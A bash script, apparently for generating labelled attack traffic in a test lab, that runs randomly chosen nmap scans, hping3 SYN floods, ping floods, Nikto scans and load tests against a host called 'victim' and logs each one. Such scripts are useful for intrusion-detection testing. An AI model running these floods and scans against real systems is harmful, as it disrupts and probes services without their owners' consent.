#!/bin/bash

TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_FILE="/logs/attack_log_${TIMESTAMP}.txt"

echo "Attack log started at $(date)" > $LOG_FILE
echo "----------------------------------------" >> $LOG_FILE

# normal traffic
# (sleep 2; while true; do curl http://victim/ > /dev/null 2>&1; sleep 1; done) &

# random attack traffic
for i in {1..20}; do
  sleep $((RANDOM % 30 + 10))
  case $((RANDOM % 5)) in
    0) 
      echo "$(date): Current attack - Nmap detailed scan" | tee -a $LOG_FILE
      nmap -A victim >> $LOG_FILE 2>&1
      ;;
    1) 
      echo "$(date): Current attack - SYN Flood DoS attack simulation" | tee -a $LOG_FILE
      hping3 -S victim -p 80 -i u100 -c 100 >> $LOG_FILE 2>&1
      ;;
    2) 
      echo "$(date): Current attack - Apache Benchmark load test" | tee -a $LOG_FILE
      ab -n 100 -c 5 http://victim/ >> $LOG_FILE 2>&1
      ;;
    3) 
      echo "$(date): Current attack - Nikto vulnerability scan" | tee -a $LOG_FILE
      nikto -h http://victim/ >> $LOG_FILE 2>&1
      ;;
    4) 
      echo "$(date): Current attack - Ping Flood" | tee -a $LOG_FILE
      timeout 2 ping -f -c 100 victim >> $LOG_FILE 2>&1
      ;; 
  esac
done

echo "----------------------------------------" >> $LOG_FILE
echo "Attack log completed at $(date)" >> $LOG_FILE
echo "Log saved to $LOG_FILE"